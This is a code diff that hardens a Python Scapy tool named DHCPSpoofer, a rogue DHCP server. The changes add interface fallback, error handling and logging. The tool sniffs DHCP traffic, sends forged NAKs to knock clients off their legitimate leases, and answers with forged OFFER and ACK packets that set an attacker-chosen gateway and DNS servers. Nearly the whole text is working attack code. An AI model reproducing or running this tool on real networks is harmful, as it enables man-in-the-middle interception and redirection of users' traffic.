@@ -23,6 +23,22 @@ class DHCPSpoofer:
         self.running = False
         self.stop_event = threading.Event()
         
+        # Validate and check interface
+        if self.interface not in get_if_list():
+            available_ifaces = get_if_list()
+            print_status(f"Interface {self.interface} not found. Available interfaces: {available_ifaces}", "warning")
+            # Try to use default interface as fallback
+            if config.INTERFACE in available_ifaces:
+                print_status(f"Falling back to default interface: {config.INTERFACE}", "info")
+                self.interface = config.INTERFACE
+            else:
+                print_status(f"Using first available interface: {available_ifaces[0]}", "info")
+                self.interface = available_ifaces[0]
+        
+        # Set up conf.iface
+        conf.iface = self.interface
+        print_status(f"Using interface: {self.interface}", "info")
+        
         # Set up logging
         logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
         self.logger = logging.getLogger(__name__)
@@ -31,100 +47,129 @@ class DHCPSpoofer:
         self.logger.info(f"Will assign IP: {self.spoofed_ip}, Gateway: {self.spoofed_gw}")
         self.logger.info(f"DNS servers: {', '.join(self.dns_servers)}")
         self.logger.info(f"Subnet mask: {self.subnet_mask}, Lease time: {self.lease_time} seconds")
+        
+        # Test interface functionality
+        try:
+            self.attacker_mac = get_if_hwaddr(self.interface)
+            self.attacker_ip = get_if_addr(self.interface)
+            self.logger.info(f"Interface MAC: {self.attacker_mac}, IP: {self.attacker_ip}")
+        except Exception as e:
+            error_msg = f"Error getting interface information: {str(e)}"
+            self.logger.error(error_msg)
+            print_status(error_msg, "error")
+            raise ValueError(error_msg)
 
     def create_dhcp_nak(self, pkt):
         """Create a DHCP NAK packet to force client to release its current lease"""
-        nak = Ether(dst=pkt[Ether].src, src=get_if_hwaddr(self.interface)) / \
-              IP(src=self.spoofed_gw, dst="255.255.255.255") / \
-              UDP(sport=67, dport=68) / \
-              BOOTP(op=2, chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) / \
-              DHCP(options=[("message-type", "nak"),
-                           ("server_id", self.spoofed_gw),
-                           "end"])
-        return nak
+        try:
+            nak = Ether(dst=pkt[Ether].src, src=get_if_hwaddr(self.interface)) / \
+                  IP(src=self.spoofed_gw, dst="255.255.255.255") / \
+                  UDP(sport=67, dport=68) / \
+                  BOOTP(op=2, chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) / \
+                  DHCP(options=[("message-type", "nak"),
+                              ("server_id", self.spoofed_gw),
+                              "end"])
+            return nak
+        except Exception as e:
+            self.logger.error(f"Error creating DHCP NAK: {str(e)}")
+            return None
 
     def create_dhcp_offer(self, pkt):
         """Create a DHCP OFFER packet"""
-        offer = Ether(dst=pkt[Ether].src, src=get_if_hwaddr(self.interface)) / \
-                IP(src=self.spoofed_gw, dst="255.255.255.255") / \
-                UDP(sport=67, dport=68) / \
-                BOOTP(op=2, chaddr=pkt[BOOTP].chaddr, yiaddr=self.spoofed_ip, xid=pkt[BOOTP].xid) / \
-                DHCP(options=[("message-type", "offer"),
-                             ("server_id", self.spoofed_gw),
-                             ("lease_time", self.lease_time),
-                             ("subnet_mask", self.subnet_mask),
-                             ("router", self.spoofed_gw)] + \
-                            [("name_server", dns) for dns in self.dns_servers] + \
-                            [("end")])
-        return offer
+        try:
+            offer = Ether(dst=pkt[Ether].src, src=get_if_hwaddr(self.interface)) / \
+                    IP(src=self.spoofed_gw, dst="255.255.255.255") / \
+                    UDP(sport=67, dport=68) / \
+                    BOOTP(op=2, chaddr=pkt[BOOTP].chaddr, yiaddr=self.spoofed_ip, xid=pkt[BOOTP].xid) / \
+                    DHCP(options=[("message-type", "offer"),
+                                 ("server_id", self.spoofed_gw),
+                                 ("lease_time", self.lease_time),
+                                 ("subnet_mask", self.subnet_mask),
+                                 ("router", self.spoofed_gw)] + \
+                                [("name_server", dns) for dns in self.dns_servers] + \
+                                [("end")])
+            return offer
+        except Exception as e:
+            self.logger.error(f"Error creating DHCP OFFER: {str(e)}")
+            return None
 
     def create_dhcp_ack(self, pkt):
         """Create a DHCP ACK packet"""
-        ack = Ether(dst=pkt[Ether].src, src=get_if_hwaddr(self.interface)) / \
-              IP(src=self.spoofed_gw, dst="255.255.255.255") / \
-              UDP(sport=67, dport=68) / \
-              BOOTP(op=2, chaddr=pkt[BOOTP].chaddr, yiaddr=self.spoofed_ip, xid=pkt[BOOTP].xid) / \
-              DHCP(options=[("message-type", "ack"),
-                           ("server_id", self.spoofed_gw),
-                           ("lease_time", self.lease_time),
-                           ("subnet_mask", self.subnet_mask),
-                           ("router", self.spoofed_gw)] + \
-                          [("name_server", dns) for dns in self.dns_servers] + \
-                          [("end")])
-        return ack
+        try:
+            ack = Ether(dst=pkt[Ether].src, src=get_if_hwaddr(self.interface)) / \
+                  IP(src=self.spoofed_gw, dst="255.255.255.255") / \
+                  UDP(sport=67, dport=68) / \
+                  BOOTP(op=2, chaddr=pkt[BOOTP].chaddr, yiaddr=self.spoofed_ip, xid=pkt[BOOTP].xid) / \
+                  DHCP(options=[("message-type", "ack"),
+                               ("server_id", self.spoofed_gw),
+                               ("lease_time", self.lease_time),
+                               ("subnet_mask", self.subnet_mask),
+                               ("router", self.spoofed_gw)] + \
+                              [("name_server", dns) for dns in self.dns_servers] + \
+                              [("end")])
+            return ack
+        except Exception as e:
+            self.logger.error(f"Error creating DHCP ACK: {str(e)}")
+            return None
 
     def handle_dhcp_packet(self, pkt):
         """Handle incoming DHCP packets"""
         if not pkt.haslayer(DHCP):
             return
 
-        mac = pkt[Ether].src
-        dhcp_options = pkt[DHCP].options
-        message_type = None
+        try:
+            mac = pkt[Ether].src
+            dhcp_options = pkt[DHCP].options
+            message_type = None
 
-        for option in dhcp_options:
-            if option[0] == "message-type":
-                message_type = option[1]
-                break
+            for option in dhcp_options:
+                if option[0] == "message-type":
+                    message_type = option[1]
+                    break
 
-        if message_type == 1:  # DHCP DISCOVER
-            self.logger.info(f"Received DHCP DISCOVER from {mac}")
-            # First send NAK to force release of current lease
-            nak = self.create_dhcp_nak(pkt)
-            sendp(nak, iface=self.interface, verbose=False)
-            self.logger.info(f"Sent DHCP NAK to {mac}")
-            
-            # Then send our offer
-            offer = self.create_dhcp_offer(pkt)
-            sendp(offer, iface=self.interface, verbose=False)
-            self.logger.info(f"Sent DHCP OFFER to {mac} with IP {self.spoofed_ip}")
-            
-            # Track client
-            if mac not in self.clients:
-                self.clients[mac] = {
-                    'ip': self.spoofed_ip,
-                    'status': 'offered',
-                    'start_time': datetime.now()
-                }
+            if message_type == 1:  # DHCP DISCOVER
+                self.logger.info(f"Received DHCP DISCOVER from {mac}")
+                # First send NAK to force release of current lease
+                nak = self.create_dhcp_nak(pkt)
+                if nak:
+                    sendp(nak, iface=self.interface, verbose=False)
+                    self.logger.info(f"Sent DHCP NAK to {mac}")
+                
+                # Then send our offer
+                offer = self.create_dhcp_offer(pkt)
+                if offer:
+                    sendp(offer, iface=self.interface, verbose=False)
+                    self.logger.info(f"Sent DHCP OFFER to {mac} with IP {self.spoofed_ip}")
+                
+                # Track client
+                if mac not in self.clients:
+                    self.clients[mac] = {
+                        'ip': self.spoofed_ip,
+                        'status': 'offered',
+                        'start_time': datetime.now()
+                    }
 
-        elif message_type == 3:  # DHCP REQUEST
-            self.logger.info(f"Received DHCP REQUEST from {mac}")
-            ack = self.create_dhcp_ack(pkt)
-            sendp(ack, iface=self.interface, verbose=False)
-            self.logger.info(f"Sent DHCP ACK to {mac} with IP {self.spoofed_ip}")
-            
-            # Update client status
-            if mac in self.clients:
-                self.clients[mac]['status'] = 'bound'
-            else:
-                self.clients[mac] = {
-                    'ip': self.spoofed_ip,
-                    'status': 'bound',
-                    'start_time': datetime.now()
-                }
+            elif message_type == 3:  # DHCP REQUEST
+                self.logger.info(f"Received DHCP REQUEST from {mac}")
+                ack = self.create_dhcp_ack(pkt)
+                if ack:
+                    sendp(ack, iface=self.interface, verbose=False)
+                    self.logger.info(f"Sent DHCP ACK to {mac} with IP {self.spoofed_ip}")
+                
+                # Update client status
+                if mac in self.clients:
+                    self.clients[mac]['status'] = 'bound'
+                else:
+                    self.clients[mac] = {
+                        'ip': self.spoofed_ip,
+                        'status': 'bound',
+                        'start_time': datetime.now()
+                    }
 
-        # Print current clients
-        self.print_clients()
+            # Print current clients
+            self.print_clients()
+        except Exception as e:
+            self.logger.error(f"Error handling DHCP packet: {str(e)}")
 
     def print_clients(self):
         """Print information about current clients"""
@@ -153,12 +198,14 @@ class DHCPSpoofer:
     def _run(self):
         """Main sniffing loop"""
         try:
+            self.logger.info(f"Starting DHCP packet sniffing on interface {self.interface}")
             sniff(filter="udp and (port 67 or port 68)",
                   prn=self.handle_dhcp_packet,
                   iface=self.interface,
                   stop_filter=lambda p: self.stop_event.is_set())
         except Exception as e:
             self.logger.error(f"Error in sniffing thread: {str(e)}")
+            print_status(f"Error in DHCP sniffing: {str(e)}", "error")
         finally:
             self.running = False
 
